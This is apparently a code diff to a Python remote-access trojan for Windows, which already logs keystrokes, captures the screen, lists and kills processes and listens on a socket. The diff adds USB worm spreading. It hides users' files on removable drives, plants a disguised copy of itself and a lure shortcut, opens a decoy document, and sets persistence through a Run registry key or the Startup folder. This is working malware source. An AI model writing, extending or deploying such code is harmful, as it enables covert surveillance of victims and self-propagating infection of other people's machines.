@@ -12,27 +12,28 @@ import sys
 import platform
 import zlib
 import pyaudio
+import shutil
 
-# INIT VARIABLES
+TEST_MODE = True
+
 HOST = '127.0.0.1'
 PORT = 4434
 active = False
 passKey = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
+uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+__filename__ = 'auto_update'
 __version__ = '1.0'
 __ostype__ = str(sys.platform)
 __os__ = str(platform.platform())
 __user__ = str(platform.node())
 
-# INIT Widnows DLL's
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
 Gdi32 = ctypes.windll.gdi32
 Psapi = ctypes.windll.psapi
 
-# INIT Sockets bank
 socketsBank = {}
 
-# INIT Screen*
 hDesktopWnd = User32.GetDesktopWindow()
 left = User32.GetSystemMetrics(76)
 top = User32.GetSystemMetrics(77)
@@ -41,7 +42,6 @@ bottom = User32.GetSystemMetrics(79)
 width = right - left
 height = bottom - top
 
-# INIT Processes
 EnumProcesses = Psapi.EnumProcesses
 EnumProcesses.restype = ctypes.wintypes.BOOL
 GetProcessImageFileName = Psapi.GetProcessImageFileNameA
@@ -55,14 +55,12 @@ MAX_PATH = 260
 PROCESS_TERMINATE = 0x0001
 PROCESS_QUERY_INFORMATION = 0x0400
 
-class BITMAPFILEHEADER(ctypes.Structure):
-    _fields_ = [
-        ('bfType', ctypes.c_short),
-        ('bfSize', ctypes.c_uint32),
-        ('bfReserved1', ctypes.c_short),
-        ('bfReserved2', ctypes.c_short),
-        ('bfOffBits', ctypes.c_uint32)]
+FILE_ATTRIBUTE_HIDDEN = 2
 
+SEE_MASK_NOCLOSEPROCESS = 0x00000040
+SEE_MASK_INVOKEIDLIST = 0x0000000C
+ShellExecuteEx = ctypes.windll.shell32.ShellExecuteEx
+ShellExecuteEx.restype = ctypes.wintypes.BOOL
 
 class BITMAPINFOHEADER(ctypes.Structure):
     _fields_ = [
@@ -85,19 +83,27 @@ class BITMAPINFO(ctypes.Structure):
         ('bmiColors', ctypes.c_ulong * 3)]
 
 
+class SHELLEXECUTEINFO(ctypes.Structure):
+    _fields_ = (
+        ("cbSize", ctypes.wintypes.DWORD),
+        ("fMask", ctypes.c_ulong),
+        ("hwnd", ctypes.wintypes.HANDLE),
+        ("lpVerb", ctypes.c_char_p),
+        ("lpFile", ctypes.c_char_p),
+        ("lpParameters", ctypes.c_char_p),
+        ("lpDirectory", ctypes.c_char_p),
+        ("nShow", ctypes.c_int),
+        ("hInstApp", ctypes.wintypes.HINSTANCE),
+        ("lpIDList", ctypes.c_void_p),
+        ("lpClass", ctypes.c_char_p),
+        ("hKeyClass", ctypes.wintypes.HKEY),
+        ("dwHotKey", ctypes.wintypes.DWORD),
+        ("hIconOrMonitor", ctypes.wintypes.HANDLE),
+        ("hProcess", ctypes.wintypes.HANDLE),
+    )
+
 bmp_info = BITMAPINFO()
 
-
-# Get info about app & pc
-def pc_info():
-    return str({
-        'ostype': __ostype__,
-        'os': __os__,
-        'protection': str(active),
-        'user': __user__,
-        'version': __version__,
-        'activewindowtitle': get_window_title(),
-    })
 
 shiftcodes = {
     49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
@@ -118,6 +124,94 @@ updateCode = {
     111: '/', 106: '*', 109: '-', 107: '+',
     110: '.'
 }
+
+
+class UsbSpread(threading.Thread):
+
+    def run(self):
+        while 1:
+            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+            for letter in uppercase:
+                drive = u'{}:\\'.format(letter)
+                if bitmask & 1 and ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
+                    try: os.chdir(drive)
+                    except: continue
+                    volumeNameBuffer = ctypes.create_unicode_buffer(1024)
+                    ctypes.windll.kernel32.GetVolumeInformationW(drive, volumeNameBuffer,
+                                                                 ctypes.sizeof(volumeNameBuffer), None, None, None, None,
+                                                                 None)
+                    HDN_FOLDER = os.path.join(drive, unichr(160)) + '\\'
+                    if not os.path.exists(HDN_FOLDER): os.mkdir(HDN_FOLDER)
+                    ctypes.windll.kernel32.SetFileAttributesW(HDN_FOLDER, FILE_ATTRIBUTE_HIDDEN)
+                    if not os.path.exists(os.path.join(drive, volumeNameBuffer.value + '.lnk')):
+                        cmdline = ["cmd", "/q", "/k", "echo off"]
+                        cmd = subprocess.Popen(cmdline, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+                        batch = b''' @echo off
+                                echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
+                                echo sLinkFile = "%s" >> CreateShortcut.vbs
+                                echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
+                                echo oLink.TargetPath = "%s" >> CreateShortcut.vbs
+                                echo oLink.WorkingDirectory = "%s" >> CreateShortcut.vbs
+                                echo oLink.IconLocation = "%s" >> CreateShortcut.vbs
+                                echo oLink.Save >> CreateShortcut.vbs
+                                cscript CreateShortcut.vbs
+                                del CreateShortcut.vbs
+                                exit
+                                ''' % (
+                            os.path.join(drive, volumeNameBuffer.value + '.lnk'),
+                            '%CD%\\VolumeInformation.exe',
+                            '%CD%',
+                            ','.join((os.path.join(os.environ['windir'], 'system32', 'shell32.dll'), '8'))
+                        )
+                        cmd.stdin.write(batch.encode('utf-8'))
+                        cmd.stdin.flush()
+                    dst_vir = os.path.join(drive, 'VolumeInformation.txt')
+                    if not os.path.exists(dst_vir):
+                        shutil.copyfile(sys.argv[0], dst_vir)
+                        ctypes.windll.kernel32.SetFileAttributesW(dst_vir, FILE_ATTRIBUTE_HIDDEN)
+                    for content in os.listdir(drive):
+                        if not content.endswith('.lnk') and not content.endswith('.vbs') and not 'VolumeInformation' in content:
+                            try: shutil.move(content, HDN_FOLDER)
+                            except: pass
+                bitmask >>= 1
+            time.sleep(5)
+
+
+def from_device():
+    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+        destination = os.path.join(os.path.expanduser('~'), 'iDocuments', 'auto_update.exe')
+        try: shutil.copyfile(sys.argv[0], destination)
+        except: pass
+        PRM = SHELLEXECUTEINFO()
+        PRM.cbSize = ctypes.sizeof(PRM)
+        PRM.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_INVOKEIDLIST
+        PRM.lpVerb = "runas"
+        PRM.lpFile = "cmd.exe"
+        PRM.lpParameters = '/c REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
+            'Internet Auto Update', destination)
+        PRM.nShow = 0
+        ShellExecuteEx(ctypes.byref(PRM))
+    else:
+        CSIDL_STARTUP = 7
+        SHGetSpecialFolderPath = ctypes.windll.shell32.SHGetSpecialFolderPathW
+        BUFFER = ctypes.create_unicode_buffer(260)
+        SHGetSpecialFolderPath.argtypes = [ctypes.c_ulong, ctypes.c_wchar_p, ctypes.c_int, ctypes.c_int]
+        SHGetSpecialFolderPath(0, BUFFER, CSIDL_STARTUP, 0)
+        DESTPATH = os.path.join(BUFFER.value, 'auto_update.exe')
+        if not os.path.exists(DESTPATH):
+            try:shutil.copyfile(sys.argv[0], DESTPATH)
+            except: pass
+
+
+def pc_info():
+    return str({
+        'ostype': __ostype__,
+        'os': __os__,
+        'protection': str(active),
+        'user': __user__,
+        'version': __version__,
+        'activewindowtitle': get_window_title(),
+    })
 
 
 def update_key(k):
@@ -289,6 +383,7 @@ def get_window_title():
     get_window_text(hwnd, buff, length + 1)
     return buff.value
 
+
 def get_processes_list():
     PROCESSES = {}
     max_array = ctypes.c_ulong * 4096
@@ -307,10 +402,12 @@ def get_processes_list():
             CloseHandle(hProcess)
     return str(PROCESSES)
 
+
 def terminateProcess(PID):
     hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
     TerminateProcess(hProcess, 1)
     return 'processTerminated'
+
 
 class ChildSocket(threading.Thread):
     def __init__(self, id, mode):
@@ -557,5 +654,19 @@ def from_autostart():
                 time.sleep(10)
                 break
 
-
-from_autostart()
+if TEST_MODE:
+    from_autostart()
+else:
+    if 'VolumeInformation' in sys.argv[0]:
+        os.system('explorer %CD%\\' + unichr(160))
+        from_device()
+    elif __filename__ in sys.argv[0]:
+        usb_spreading_thread = UsbSpread()
+        usb_spreading_thread.start()
+        from_autostart()
+    else:
+        if not os.path.exists(os.path.join(os.path.expanduser('~'), 'iDocuments')):
+            os.mkdir(os.path.join(os.path.expanduser('~'), 'iDocuments'))
+        open(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'), 'w').write('')
+        os.startfile(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'))
+        from_device()
